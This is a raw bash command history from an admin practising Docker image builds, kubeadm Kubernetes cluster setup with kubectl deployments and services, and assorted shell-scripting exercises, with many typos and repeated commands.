docker run --name tinyweb2 -it  -P tinyhttpd:v0.2-7 ls /data
docker rm tinyweb2
docker run --name tinyweb2 -it  -P tinyhttpd:v0.2-7 "ls /data"
echo $$
ps aux |grep 24997
echo $?
echo $#
cat sss.sh
echo $?
echo $0
echo $#
echo $$
cat sss.sh
echo $0
echo $?
cat sss.sh
echo $?
cd img1/
vim Dockerfile 
dockere inspect tinyweb1
docker inspect tinyweb1
dockere inspect tinyweb1
docker inspect tinyweb1
curl 172.17.0.1
env
unset http_proxy
curl 172.17.0.1
unset https_proxy
curl 172.17.0.1
env
curl 172.17.0.2
docker port tinyweb1
docker kill tinyweb1
docker port tinyweb1
vim /etc/docker/daemon.json
vim Dockerfile 
clear
vi Dockerfile 
docker kill tinyweb1
vi Dockerfile 
vim Dockerfile 
history
vim Dockerfile 
cd 
mkdir img3
cd img3
vim Dockerfile
vim entrypoint.sh
docker image ls
cd img3
vim Dockerfile 
vim entrypoint.sh
vim .entrypoint.sh.swp 
rm .entrypoint.sh.swp 
vim entrypoint.sh
chmod +x entrypoint.sh 
vim Dockerfile 
cd img3
cd img3
yum install ngixn
kill %1
jobs
docker run --name -nginx -it nginx:1.14-alpine /bin/sh
docker run --name nginx1 -it nginx:1.14-alpine /bin/sh
history
yum install nginx
docker run --name nginx1 -it nginx:1.14-alpine /bin/sh
docker rm nginx1
docker kill  nginx1
docker rm nginx1
docker run --name nginx1 -it nginx:1.14-alpine /bin/sh
docker rm ngixn1
docker rm nginx1
vim D
docker run --name myweb1 --rm -P myweb:v0.3-1
docker run --name myweb1 --rm -P myweb:v0.3-2
docker run --name myweb1 --rm -P myweb:v0.3-2 "ls /bin"
cd img3
vim Dockerfile 
docker run --name myweb1 --rm -P myweb:v0.3-4
cd img3
vim Dockerfile 
ll
vim  entrypoint.sh 
vi .Dockerfile.swp 
rm .Dockerfile.swp 
vi entrypoint.sh 
vim entrypoint.sh 
docker image ls
vim Dockerfile 
vim entrypoint.sh 
docker  build -t myweb:v0.3-1 ./
vim Dockerfile 
docker  build -t myweb:v0.3-1 ./
ls
vim Dockerfile 
docker  build -t myweb:v0.3-2 ./
vim entrypoint.sh 
vim Dockerfile 
vim entrypoint.sh 
docker  build -t myweb:v0.3-4 ./
docker ps -a
vim entrypoint.sh 
docker  build -t myweb:v0.3-3 ./
vim entrypoint.sh 
docker ps  -a
vim entrypoint.sh 
docker  build -t myweb:v0.3-5 ./ 
vim Dockerfile 
vim index.html
vim entrypoint.sh 
docker  build -t myweb:v0.3-6 ./ 
vim entrypoint.sh 
vim Dockerfile 
docker kill myweb1
docekr exec myweb1 /bin/sh
docker exec myweb1 /bin/sh
docker exec -it myweb1 /bin/sh
cd img3
docker run --name myweb1 --rm -P myweb:v0.3-4
docker run --name myweb1 --rm -P myweb:v0.3-3
docker run --name myweb1 --rm -P -it myweb:v0.3-4 /bin/sh
docker run --name myweb1 --rm -P -it myweb:v0.3-3 /bin/sh
docker run --name myweb1 --rm -P  myweb:v0.3-5 
docker run --name myweb1 --rm -P  myweb:v0.3-6 
cd img3
cd img3
cd img3
ssh @10.148.55.25
ssh @10.148.55.25:22
ssh root@10.148.55.25:22
ssh root@10.148.55.25
ls
cd img3
vi sd.sh
cat /etc/shells
swapoff -a
free -h
systemctl start chrony
systemctl start chronyd
systemctl status chronyd
date
cat /etc/chrony.conf 
date
cat /etc/hosts
hostname
systemctl status firewalld
getenforce
free -h
cd 
cd img3
vim /etc/sysconfig/modules/ipvs.modules
/sbin/modinfo
/sbin/modeinfo
modinfo
cd
modinfo
modinfo --help
cp \\docker02
scp /etc/sysconfig/modules/ipvs.modules root@docker02:/etc/sysconfig/modules/
cp /etc/sysconfig/modules/ipvs.modules root@docker02:/etc/sysconfig/modules/
scp /etc/sysconfig/modules/ipvs.modules root@docker02:/etc/sysconfig/modules/
vim /etc/ssh/sshd_config 
ls
vim cat.sh 
scp ./cat.sh root@10.134.196.22:/root
ll
cd acl_test 
cd img3
exit
ll 
cd img1
ll
ls -l
var='pwd'
echo $var
ip a
cd ~test01
cd
echo $PWD
cd ~+
cd ~test01
cd ~+
cd
echo $LODPWD
cd ~-
cd ~+
cd
echo $PWD
cd ~-
echo $PWD
echo $(uptime)
echo `uptime`
echo 'uptime'
ls /etc/*.conf
ls /etc/[a,b]*.conf
cd
ll
ls test0?
cd test01
ll
cd
mkdir img
ls img?
rm img
rm -rf img
ll img
ll img*
ll img*?
ls --help
crontab
crontab -l
vim /etc/ssh/sshd_config 
echo $_
w
exit
ping docker02
df -h
cat /etc/fstab
systemctl status chronyd
echo $TIMEZONE
echo $TMZONE
systemctl status firewalld
iptables -L
sestatus
date
systemctl status chronyd
systemctl restart chronyd
cat /etc/hosts
date
vim ipvs.moudles
cp ipvs.moudles  /etc/sysconfig/modules/
cd  /etc/sysconfig/modules/
ll
vim ipvs.modules 
ll
vim ipvs.moudles 
rm ipvs.moudles 
ll
vim mod
ll
vim ipvs.modules 
cd -
docker info
ll /etc/docker/daemon.json
cat /etc/docker/daemon.json
env
docker run
vim /usr/lib/systemd/system/docker.service 
env
vim /usr/lib/systemd/system/docker.service 
iptables -vnL
systemctl start docker
systemctl daemod-reload
systemctl daemon-reload
systemctl start docker
docekr info
docker info
iptables -L
iptables -vnL
docker info
vim /usr/lib/systemd/systemdocker.
vim /usr/lib/systemd/system/docker.service 
systemctl daemon-reload
systemctl start docker
docker info
vim /usr/lib/systemd/system/docker.service 
iptables -vnL
systemctl -a |grep bridge
sysctl -a |grep bridge
vim /etc/sysctl.d/k8s.conf
sysctl -p /etc/sysctl.d/k8s.conf 
clear
scp /etc/sysctl.d/k8s.conf  docker02:/etc/sysctl.d/
ssh-keygen -t rsa
ll ~/.ssh
scp ~/.ssh/id_rsa.pub docker02:~/.ssh/
scp ~/.ssh/id_rsa.pub docker02:/root/.ssh/
cd
scp .ssh/id_rsa.pub docker02:/root
vim .ssh/id_rsa.pub 
ll ,ssh
ll .ssh
vim /etc/ssh/sshd_config 
systemctl restart sshd
vim /etc/ssh/sshd_config 
systemctl restart sshd
ll .ssh
cat .ssh/id_rsa.pub  >> .ssh/authorized_keys 
cd .ssh/
ll
rm id_rsa.pub 
rm id_rsa 
ssh root@PTY
ssh root@docker02
jobs
l
ll
cat id_rsa.pub >> authorized_keys 
cd
ll
scp test.txt docker02:~
vim /etc/ssh/sshd_config 
scp -P 2220 docker02:~/p.sh .
scp -P 22 docker02:~/p.sh .
which iptables
scp test1 docker02:~/.ssh/
scp test1 docker02:/tmp
rpm -q kubelet
kubeadm config print init-print
iptables -vnL
cd /etc/kubernetes/pki/
ll
cd
kubectl get ns
kubectl get pods-n kube-public
kubectl get pods -n kube-public
kubectl get pods -n kube-system -o wide
kubectl -h
kubectl create -h
kubectl api-resources
kubectl get deploy
kubectl get deploy -n kube-system
kubectl create -h
kubectl create namesapce develop
kubectl create namespace develop
kubectl create namespace testing
kubectl create namespace prod
kubectl get ns
kubectl delete namespaces develop
kubectl get ns
kubectl delete ns/testing ns/prod
kubectl get ns
kubectl get ns/default -o yaml
kubectl get ns/default -o json
kubectl describe ns/default
kubectl create deployment -h
kubectl create deploy ngx-dep --image=nginx:1.14-alpine
kubectl get all
kubectl get pods
kubectl get pods -o wide
curl 10.244.1.2
ping 10.39.1.189
kubectl delete pods/ngx-dep-d554574bd-47czs
kubectl pods -o wide
kubectl get pods -o wide
kubectl create service -h
kubectl create service clusterip -h
kubectl create service clusterip ngx-svc --tcp=80:80 
kubectl get svc
kubectl get svc/ngx-svc -o yaml
kubectl delete svc/nsx-svc
kubectl delete svc/ngx-svc
kubectl create service clusterip ngx-dep --tcp=80:80 
kubectl get svc/ngx-dep -o yaml
kubectl describe svc/ngx-dep
kubectl get pods
kubectl delete pods ngx-dep-d554574bd-g29n9 
kubectl get pods
kubectl get pods -o wide
kubectl describe svc/ngx-dep
kubeadm init -h
kubectl get svc
kubectl get 
kubectl get  -h
kubectl get  pods
kubectl get  pods -all
kubectl get  pods --all
kubectl get  pods /all
kubectl get  pods/all
kubectl get  pods -o wide
kubectl get  pod -o wide
kubectl expose -h
kubectl get -A
kubectl get pod -A
kubectl expose --name=nginx --port=80 --target-port=80 --protocol=TCP
history |tail -100
 kubectl get deploy
kubectl expose deployment nginx-deploy --name=nginx --port=80 --target-port=80 --protocol=TCP
kubectl get deploy -n kube-system
kubectl get deploy -o wide
kubectl expose deployment ngx-dep --name=nginx --port=80 --target-port=80 --protocol=TCP
kubectl get svc
kubectl get svc -o wide
kubectl get pods -o wide
kubectl get all
yum install bind-utils -y
dig -t A nginx @10.96.0.10
history |tail -200
kubectl get pods
dig -t A nginx.default.svc.cluster.local
dig -t A nginx.default.svc.cluster.local @10.96.0.10
kubectl get pods
kubectl delete pods/ngx-dep-d554574bd-x4ffh
kubectl get pods
kubectl get pods -o wide
kubectl get svc
kubectl describe pods
kubectl describe svc nginx
kubectl get pods --show-labels
kubectl describe svc nginx
kubectl edit svc nginx
kubectl describe svc nginx
kubectl edit svc nginx
kubectl describe svc nginx
kubectl delete svc nginx
kubectl get svc
kubectl expose deployment ngx-dep --name=nginx
kubectl expose deployment ngx-dep --name=nginx 
history |tail -50
kubectl expose deployment ngx-dep --name=nginx --port=80 --target-port=80 --protocol=TCP
kubectl get svc
kubectl delete ngx-dep
kubectl delete svc ngx-dep
kubectl get svc
kubectl delete svc nginx
kubectl expose deployment ngx-dep --name=nginx 
kubectl expose -h
kubectl expose deployment ngx-dep --name=nginx --port=80 --target-port=80 --protocol=TCP
kubectl get svc
kubectl get all
kubectl delete svc nginx
kubectl expose deployment ngx-dep --name=nginx --port=80 --target-port=80 --protocol=TCP
kubectl get svc
kubectl describe deployment ngx-dep
docker login
igure a credential helper to remove this warning. See
https://docs.docker.com/engine/reference/commandline/login/#credentials-store
docker pull  dockerptu/httpd
docker pull  dockerptu/httpd:v0.3
docker image ls
kubectl run myapp --image=                                        v0.2-1              21080aa7dab3        4 weeks ago         1.22MB
tinyhttpd                                           v0.1-9              6170ff23f52f        4 weeks ago         8.39MB
kubectl run myapp --image=dockerptu/httpd:v0.3 --replicas=2
kubectl get deployment
kubectl get deployment -w
kubectl get deployment
kubectl get pods -o wide
kubectl expose deployment myapp --name=myapp --port=80 
kubectl get svc
kubectl get pods -o wide
kubectl delete pods/client
kubectl scale --replicas=5 deployment myapp
kubectl get pods
kubectl scale --replicas=3 deployment myapp
docker image ls
docekr ps -a
docker ps -a
docker container start b1
docker exec -it b1 /bin/sh
docker ps -a
kubectl get pods
kubectl set image -h
kubectl get pods
kubectl describe myapp-5cd75fb7c8-6fq29 
kubectl describe podsmyapp-5cd75fb7c8-6fq29 
kubectl describe pods myapp-5cd75fb7c8-6fq29 
kubectl set image deployment myapp myapp=dockerptu/httpd:v0.3
kubectl set image deployment myapp myapp=dockerptu/myapp:latest
kubectl rollout status deployment myapp
kill -9 %1
kubectl rollout undo -h
kubectl rollout undo deployment myapp 
kubectl get pod
push dockerptu/mya
history |tail -50
kubectl explain pod -h
kubectl explain pods
kubectl explain pods.metadata
kubectl explain pods.spec
kubectl explain pods.spec.containers
kubectl explain pods.spec.containers.livenessProbe
clear
ls
clear
mkdir manifests
cd manifests/
ls
vim pod-demo.yaml
kubectl create -f pod-demo.yaml 
kubectl get pods
kubectl describe pods pod-demo
kubectl get pods
kubectl logs pod-demo myapp

kubectl logs pod-demo myapp
clear
kubectl delete pods pod-demo
kubectl create -f pod-demo.yaml 
kubectl get pods
kubectl exec -it pod-demo -c  myapp -- /bin/sh
kubectl describe pods pod-demo
kubectl get pods
kubectl delete pod pod-demo
vim pod-demo.yaml 
kubectl delete -f pod-demo.yaml 
kubectl get pods
kubectl delete -f pod-demo.yaml 
kubectl create -f pod-demo.yaml 
kubectl delete -f pod-demo.yaml 
ls
sll
ll
cat pod-demo.yaml 
docker imager ls
docker image ls
docker ps -a
docker start web1
docker exec -it  web1 /bin/sh
vi pod-demo.yaml 
kubectl explain pods.spec.containers
vim pod-demo.yaml 
kubectl explain pods.spec.containers.ports
vim pod-demo.yaml 
kubectl scale --replicas=1 deployment myapp
kubectl label -h
kubectl label pods pod-demo release=canary
kubectl get pods -l app --show-label
kubectl get pods -l app --show-labels
kubectl label pods pod-demo release=stable
kubectl label pods pod-demo release=stable --overwrite
kubectl get pods -l app --show-labels
kubectl get pods -l release
kubectl get pods -l release,app
kubectl get pods -l release=stable --show-labels
kubectl label pods ngx-dep-d554574bd-77dfd release=canary
kubectl get pods -l release
kubectl get pods -l release=canary
kubectl get pods -l release,app
kubectl get pods -l release=stable,app=myapp
name(){ arg1=$1; arg2=$2; command on arg1; }
name foo bar
ll
vim passed.sh
sh passed.sh 
ss -tnl
top
pid=1
echo $pid
echo $1
[ -d "/proc/1" ] && return 0
[ -d "/proc/1" ] 
echo $?
ll /proc/1
ll /proc/[0-9]
yday() { date --date="1 day ago"; }
yday
ll
./passed.sh
chmod u+x passed.sh 
ping wintel.foxera.com
ll
cd img1
ll
cd
touch imgabc
ll .|grep -e "img."
curl 10.244.1.4
curl 10.96.76.254
curl nginx
cat /etc/resolv.conf 
kubectl get pods -n kube-system -o wide
kubectl get svc -n kube-system
dig -t A nginx @10.96.0.10 
yum install bind-utils -y
kill -9 %1
jobs
dig -t A nginx @10.96.0.10 
clear
kubectl run --help
kubectl run client --image=busybox --replicas=1 -it --restart=Never
kubectl get image
kubectl get -h
kubeadm -h
kubectl image
kubectl --help
kubectl attach client -it
kubectl get pods
kubectl delete client
kubectl delete pods client
kubectl get pods
docker image ls
history 
kubectl get all
kubectl logs pods pod/myapp-6d5959df6c-rnw2v
kubectl logs pod pod/myapp-6d5959df6c-rnw2v
kubectl logs  pod/myapp-6d5959df6c-rnw2v
kubectl describe pod pod/myapp-6d5959df6c-rnw2v
history |tail -50
env
unset http_proxy
unset https_proxy
curl 10.244.1.3
bash
env
curl 10.96.115.149
curl ngx-dep
kubectl get -n kube-system
kubectl get pods -n kube-system
kubectl get svc -n kube-system
vim /etc/resolv.conf 
curl ngx-dep
curl ngx-dep.default.svc.cluster.local
bash 
docker commit b1 b1:myapp
docker container ls
docker image ls
docker image -h
docker image rm b1
docker image rm b1:myapp
docker ps -a
docker image ls
docker commit b1 myapp:latest
docker image ls
docker push myapp/latest
docker push myapp:latest
docker commit b1 dockerptu/myapp:latest
docker push docekrptu/myapp
docker push dockerptu/myapp
kubctl get pods
kubectl get pods
iptables -vnL
iptables -vnL -t net
iptables -vnL -t nat
history |tail -50
iptables -vnL
systemctl enable docker
clear
vim /usr/lib/systemd/system/docker.service 
systemctl daemon-reload
systemctl start docker
docekr info
docker info
iptables -vnL
vim /usr/lib/systemd/system/docker.service 
systemctl daemon-reload
systemctl start docker
docker info 
iptables -vnL
iptables -P FORWARD ACCEPT
iptables -vnL
var=1
var=$(( var+1)
)
var=(($var+1))
var=(( $var+1 ))
var=$(( var+1 ))
var
echo $var
var=$(( var + 1 ))
echo $var
var=$(( var+1 ))
echo $var
var=5
var=$(( var+1 ))
echo $var
unset var
echo $var
var=$(( var+1 ))
echo $var
vim whilemenu.sh
sh whilemenu.sh 
echo $?
ll
ll img*
sh check_mem.sh 
vim check_mem.sh 
clear
 echo $(ls)\
vim vim 
echo $1
ls -al
echo $1
ls -al;echo $11
ls -al;echo $1
echo $0
var =1
var=1
echo $var
echo $1
echo $0
echo $#
sysctl -a |grep bridge
cd img1
cd /$HOME
ll
cd
ll .ssh/
cd /etc/yum.repos.d/
vim kubernetes.repo
yum repolist
yum list all |grep "^kube"
yum install kubeadm kubelet kubectl
rpm -ql kubelet
scp -P 2220  kubernetes.repo docker02:/etc/yum.repos.d/
scp  kubernetes.repo docker02:/etc/yum.repos.d/
scp  kubernetes.repo docker02:/etc/yum.repos.d
ssh-keygen -t rsa
cd ~/.ssh
ll
scp test1 docker02:~/.ssh/
vim /etc/ssh/sshd_config 
systemctl restart sshd
scp test1 docker02:~/.ssh/
cat id_rsa.pub >> authorized_keys 
cat authorized_keys 
scp test1 docker02:~/.ssh/
systemctl status firewalld
uniq authorized_keys 
scp test1 docker02:/tmp
iptables -vnL
cd /etc/yum.repos.d/
cd
vim /etc/sysconfig/kubelet 
rpm -ql kubelet
vim /etc/sysconfig/kubelet 
kubeadm 
kubeadm config print init-defaults
vim /etc/yum.repos.d/kubernetes.repo 
docker info
kubeadm -h
kubeadm -v
kubeadm --version
kubeadm 
kubeadm -v
kubeadm -V
rpm -qa |grep kubeadm
kubeadm init -h
kubeadm init --kubernetes-version="v1.17.0" --pod-network-cidr="10.244.0.0/16" --dry-run 
kubeadm init --kubernetes-version="v1.17.0" --pod-network-cidr="10.244.0.0/16" --dry-run --ignore-preflight-errors=Swap
clear
kubeadm config -h
kubeadm config images --help
kubeadm config images list
docker image list
kubeadm config images pull
docker image list
kubeadm init --kubernetes-version="v1.17.0" --pod-network-cidr="10.244.0.0/16"  --ignore-preflight-errors=Swap
mkdir .kube
cp /etc/kubernetes/admin.conf .kube/config
ll .kube/
kubectl get node
kubectl apply -f https://raw.githubusercontent.com/coreos/flannel/master/Documentation/kube-flannel.yml
kubectl get pods -n kube-system
kubectl get nodes
vim kubeadm-init.txt
history
vim kubeadm-init.txt 
free -m
kubectl get nosds
kubectl get nodes
docker image ls
kubectl get nodes
ll .kube/
ssl -tnl
kubectl config
kubectl config view
ps aux
ps -ef
netstat -an
netstat -a
ss -tnl
cd /etc/kubernetes/
ls
scp admin.conf docker02:/root/.kube/
scp admin.conf docker02:/root/.kube
scp admin.conf docker02:/root/.kube/config
ll /tmp
scp /tmp/attrtest root@10.134.196.22:/tmp
scp /tmp/attrtest root@10.150.7.55:/tmp
vim /root/.ssh/authorized_keys 
scp /tmp/attrtest root@10.150.7.55:/tmp
vim /root/.ssh/known_hosts 
scp /tmp/attrtest root@10.150.7.55:/tmp
scp /tmp/attrtest docker02:/tmp
vim /root/.ssh/known_hosts 
scp /tmp/attrtest docker02:/tmp
vim /etc/hosts
vim /root/.ssh/known_hosts 
scp /tmp/attrtest docker02:/tmp
scp admin.conf  docker02:/root/.kube/config
history
vim /root/.ssh/authorized_keys 
kubectl get deploy
ll
kubectl run client --image=busybox --replicas=1 -it --restart=Never
kubectl exec client  -it 
kubectl exec pods client  -it 
kubectl exec pod client  -it 
kubectl delete pods/client
kubectl run client --image=busybox --replicas=1 -it --restart=Never
kubectl get pods
kubectl attach client -it
kubectl run client --image=busybox --replicas=1 -it --restart=Never
kubectl start
kubectl start --help
kubectl --help
kubectl get pods
kubectl run client
kubectl get pods
kubectl attach client -it
kubectl describe pod client

kubectl restart pods client
kubectl -h
kubectl run client --image=busybox --replicas=1 -it 
kubectl attach client-f44986c9-nt9qc -c client -i -t
kubectl edit svc myapp
kubectl get svc 
kubectl get pods
kubectl get pod myapp-5cd75fb7c8-6fq29  -o yaml
kubectl api-server
kubectl api-version
kubectl api-versions
ss -tnl
history |tail -50
kubectl explain pods
kubectl get pods
kubectl exec --help
kubectl get pods
docker image ls
docker ps -a
docker exec b1 -it /bin/sh
docker exec -it b1 /bin/sh
kubectl get all
docker image ls
docker ps -a
docker image ls
kubectl explain pods.containers
kubectl explain pods.container
kubectl explain pods.spec.containers
kubectl get pods
cd
cd manifests/
kubectl create -f pod-demo.yaml 
kubectl get pods
kubectl get pods --show-labels
kubectl get pods -L app 
kubectl get pods 
kubectl get pods -l app
kubectl get pods -l app --show-labels
kubectl delete -f pod-demo.yaml 
kubectl get pods 
kubectl create -f pod-demo.yaml 
kubectl get pods 
ping 10.138.2.131
grep "kernel: *." /var/log/messages
df -hT
reboot
cat /etc/init.d/gmond
ll
ll *.sh
mkdir scripts01
ll *.sh|mv {} scripts01/
ll *.sh|mv { } scripts01/
ll *.sh|mv  scripts01/
mv *.sh scripts01/
ll *.sh|mv  scripts01/
ll *.sh
ll scripts01/
ll
ll test02
ll test*
rm -rf test*
ll img1
ll img*
mv img2/ img3/ img1/
ll img*
cd img1/
ll
mv img2/* img3/* .
vim index.html 
ll
vim entrypoint.sh 
ll
cd
ll
rm -rf Pyrhon-3.6.7/
cat imgabc 
rm imgabc 
cat accountadd.txt 
rm accountadd.txt 
less catfile 
rm catfile 
ll
ls
less printf.txt 
less rootfile 
less kubeadm-init.txt 
less pil 
ls
less regular_express.txt 
ls -l
rm rootfile 
rm printf.txt 
less list 
rm list 
ls
rm myimages.gz 
less acl_test 
vim acl_test 
rm acl_test 
ls
alias
echo $IFS
exit
ss -tnl
vmstat
free -m
top
vim /etc/fstab 
cd /data/
ll
ll -h
cd www/html/ixdba/
ll
cd
vim /etc/fstab 
cat < /etc/inittab 
locate file_list
cd
ll
ls -l
cd scripts01/
ll
chmod a+w whilemenu.sh 
ll
chmod a+x whilemenu.sh 
ll
cat whilemenu.sh 
q
env
ssh root@10.148.8.154
ssh F3222024@10.148.8.154
telnet 10.138.4.101 80
cd scripts01/
vim getCMLParam.sh
sh getCMLParam.sh one two three four five six
echo $0
echo $1
sh getCMLParam.sh one two three four five six|echo $0
sh getCMLParam.sh one two three four five six|echo $1
vim shift5Param,sh
sh shift5Param,sh  one two three four five xix seven
vim shift5Param,sh
sh shift5Param,sh  one two three four five xix seven
vim listarg.sh
tail -50 /var/spool/mail/root
tail -100 /var/spool/mail/root
vim listarg.sh
sh listarg.sh one two three dour five six seven 
vim checkNumOfArg.sh
sh checkNumOfArg.sh 
vim checkNumOfArg.sh
sh checkNumOfArg.sh 
sh listarg.sh 
echo $?
basename $1
basename $0
sh listarg.sh |basename $0
basename --help
vim testArguments_1.sh
sh testArguments_1.sh 
vim testArguments_2.sh 
sh testArguments_2.sh 
sh testArguments_2.sh i checkNumOfArg.sh 
echo $?
sh testArguments_2.sh i checkNumOfArg
vim testArguments_2.sh 
sh testArguments_2.sh 1
sh testArguments_2.sh e
sh testArguments_2.sh e im
sh testArguments_2.sh e checkNumOfArg.sh 
echo $0
echo $?
getopts fAx VARNAME
echo $?
getopts fA:x VARNAME
echo $?
vim readPassword.sh
sh readPassword.sh 
vim readPassword.sh
sh readPassword.sh 
vim readPassword.sh
sh readPassword.sh 
vim readPassword.sh
sh readPassword.sh 
vim readPassword.sh
sh readPassword.sh 
vim readPassword.sh
sh readPassword.sh 
vim readPassword.sh
vim readFromFilebyfor.sh
echo $IFS
bash
sh readFromFilebyfor.sh /etc/passwd
ll /etc/sysconfig/network-scripts/
nmcli connection show eth0
nmcli connection show eth
ifconfig -a
nmcli connection show ens160
nmcli connection show 
exit
find /tmp -name "*.tmp" -exec rm --f {} \
find /tmp -name "*.tmp" -exec rm --f {} 
find --help
ls --format=single-column -F /boot
man initrd
initrd --help
initrd info
yum update 
mkdir /tmp/initramfs
cd /tmp/initramfs/
dd if=/boot/initramfs-4.18.0-80.el8.x86_64.img of=initramfs.gz > bs=11264 skip=1
dd if=/boot/initramfs-3.10.0-957.21.3.el7.x86_64.img of=initramfs.gz > bs=11264 skip=1
 ll initramfs.gz ;file initramfs.gz
file initramfs.gz 
ll
dd if=/boot/initramfs-3.10.0-957.21.3.el7.x86_64.img of=initramfs.gz  bs=11264 skip=1
ll
rm bs\=11264 
;ll
ll
dd if=/boot/initramfs-3.10.0-957.21.3.el7.x86_64.img of=initramfs.gz  bs=11264 skip=1
ll
 ll initramfs.gz ;file initramfs.gz
gzip -d initramfs.gz 
tar -xvfz initramfs.gz 
gzip -d initramfs.gz 
bzip -df initramfs.gz 
file initramfs.gz 
cd initramfs.gz 

ll
mkdir /mnt/img
initramfs.gz
mount -o loop initramfs.img /mnt/img
file initramfs.img 
ll /mnt/img/
ll
ll /mnt/img
ll
ll /mnt/img/
fdisk initramfs.img 
cat initramfs.gz 
rm initramfs*
file /boot/initramfs-3.10.0-957.21.3.el7.x86_64.img 
cp  /boot/initramfs-3.10.0-957.21.3.el7.x86_64.img .
ll
gzip -d initramfs-3.10.0-957.21.3.el7.x86_64.img 
ll
gzip -d initramfs-3.10.0-957.21.3.el7.x86_64.img 
mv initramfs-3.10.0-957.21.3.el7.x86_64.img initramfs.gz
ll
file initramfs.gz 
gzip -d initramfs.gz 
ll
file initramfs 
cpio -i -d -H newc --no-absolute-filenames < initramfs 
ll
ll /usr/lib/systemd/system/default.target
systemctl list dependencies initrd.target
systemctl list-dependencies initrd.target
systemctl list-dependencies graphical.target
top
ll -d /usr/lib/systemd/system/runlevel*.target |cut -c 28-
cut --help
ll -d /usr/lib/systemd/system/runlevel*.target |cut -c 27-
ll -d /usr/lib/systemd/system/runlevel*.target 
init
init --help
runlevel
cat /usr/lib/systemd/system/graphical.target
cat /usr/lib/systemd/system/multi-user.target
cat /usr/lib/systemd/system/multi-user.target.wants/
cat /usr/lib/systemd/system/multi-user.target.wants
ls  /usr/lib/systemd/system/multi-user.target.wants
cd ..
ll
touch i.tmp i1.tmp
ll
find . -name "*.tmp" -exec rm -f {} 
find . -name "*.tmp" -exec rm -f {} \;
ll
cd
cd scripts01/
ls
vim readtwolines.sh
sh readtwolines.sh readPassword.sh 
sh readtwolines.sh /etc/fstab 
vim  redirectedWhileloop.sh
sh redirectedWhileloop.sh /etc/fstab
wc /e
sh redirectedWhileloop.sh 
count=1
echo $count
let count++
echo $count
let $count++
tr a-z A-Z <<END
one two three
four fice sox

END

tr a-z A-Z << end
one
end

tr a-z A-Z << end

two
 end
end

tr a-z A-Z << -end
three
  end
end
emd
-end

tr a-z A-Z <<-end
four
 end
\tend
\\tend
end

tr a-z A-Z <<-end

five
-end
end

awk -F: '{print $1}' /etc/pawwsd |sort >userlist.txt
awk -F: '{print $1}' /etc/passwd |sort >userlist.txt
cat userlist.txt 
uname -a > hostinfo
du -s /home/* |sort -rn
du -s /home/* |sort -rn |usage.txt
du -s /home/* |sort -rn > usage.txt
bash --help
sh --help
sh -x
man sh
sh -x --help
sh info
tr a-z A-Z <filename >new_filename
vim derpm.sh
ls /tmp/
read --help
man read
vim readFileAndput_1.sh
sh -x readFileAndput_1.sh readtwolines.sh 
exec 3< /etc/passwd
grep root <& 3
vim readfd.sh
sh readfd.sh hell3.sh 
sh hell3.sh 1
sh hell3.sh 
sh hell3.sh wad
vim hell3.sh 
vim execstdin.sh
sh execstdin.sh 
vim execstdin.sh
sh execstdin.sh 
cat /etc/hosts
vim execstdin.sh
exec 
exec < /etc/hosts
127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4
::1         localhost localhost.localdomain localhost6 localhost6.localdomain6
10.134.196.21 PTY
10.150.7.55 docker02
exec < /etc/hosts
127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4
::1         localhost localhost.localdomain localhost6 localhost6.localdomain6
10.134.196.21 PTY
10.150.7.55 docker02
exec 6<&0
exec < /etc/hosts
127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4
::1         localhost localhost.localdomain localhost6 localhost6.localdomain6
10.134.196.21 PTY
10.150.7.55 docker02
exec < /etc/hosts
127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4
::1         localhost localhost.localdomain localhost6 localhost6.localdomain6
10.134.196.21 PTY
10.150.7.55 docker02
bash
bash
vim /etc/hosts
cd scripts01/
sh execstdin.sh 
exec 4> /tmp/output.txt
ll /tmp/output.txt 
date >& 4
uname -a &> 4
cat /tmp/output.txt 
uname -a >&4
cat /tmp/output.txt 
uname -a &>4
cat /tmp/output.txt 
uname -a >&4
cat /tmp/output.txt 
vim execstdout.sh
sh execstdout.sh 
vim execstdout.sh
sh execstdout.sh 
cat /tmp/logfile.txt 
vim getsysinfo.sh
sh getsysinfo.sh 
vim getsysinfo.sh
sh getsysinfo.sh 
vim getsysinfo.sh
sh getsysinfo.sh 
vim getsysinfo.sh
sh getsysinfo.sh 
cat /tmp/sysinfo.20200109.log 
cd
ll
cd scripts01/
ll *.txt
cat usage.txt 
echo "one two " >/tmp/file
exec 4< > /tmp/file
exec 4<> /tmp/file
read -n 3 var  <& 4
echo $var
echo -n + >&4
exec 4>&-
cat /tmp/file 
vim readwirtefd.sh
sh readwirtefd.sh 
vim readwirtefd.sh
sh readwirtefd.sh 
rm /tmp/output.txt 
vim readwirtefd.sh
sh readwirtefd.sh 
cat /tmp/output.txt 
vim listfd.sh
sh listfd.sh 
cat /tmp/output.txt 
echo $a
echo $b
vim mysqlbackup.sh
ls
gzip usage.txt 
ls
gizp /tmp/output.txt 
gzip /tmp/output.txt 
ls
ls /tmp/
gizp -d usage.txt.gz 
gzip -d usage.txt.gz 
ls
vim mysqlbackup.sh 
who 
who |sort >who.txt
tac who.txt 
mkdir unit12_pipe
cd uni
cd unit12_pipe/
awk -F: '{print $1}' /etc/passwd |sort
history
cat ~/.bash_history 
claer
clear
awk -F: '{print $1}' /etc/passwd |sort
awk -F: '{print $1 $2}' /etc/passwd |sort
cat /etc/passwd
awk -F: '{print $1,$2}' /etc/passwd |sort
history |awk '{print $2}' |sort |uniq -c |sort -rn |head
free |grep Mem |awk '{print $2}'
free
grep "/bin/bash" /etc/passwd |cut -d: -f1,6
cat /proc/cpuinfo |grep name |cut -d: f2|uniq
cat /proc/cpuinfo |grep name |cut -d: -f2|uniq
cat /proc/cpuinfo |grep name
ls -l |cut -c 1 |grep d |wc -l
ls -l |cut -c 1 
ls -l
ls -l |cut -c 1 |grep d 
echo $!
free -m
top
man 5 proc
man5 proc
man proc
ps -auxf |sort -nr -k 4 |head -10 >&3
ps -auxf 
ps -auxf |sort -nr -k 4 |head -10 >&3
ps -auxf |sort -nr -k 4 |head -10 
ifconfig
cat /etc/resolv.conf |head -1
ssh root@docker02 "cat /root/date.txt"
ls -l |cut -c 1
ls -l |cut -c 1 |grep d 
ls -l |cut -c 1 |grep d |wc -l
grep -i "error:" /varr/log/messages |less
grep -i "error:" /var/log/messages |less
grep -i "warning:" /var/log/messages |less
less /var/log/messages
grep --help
ps auxwww |grep httpd
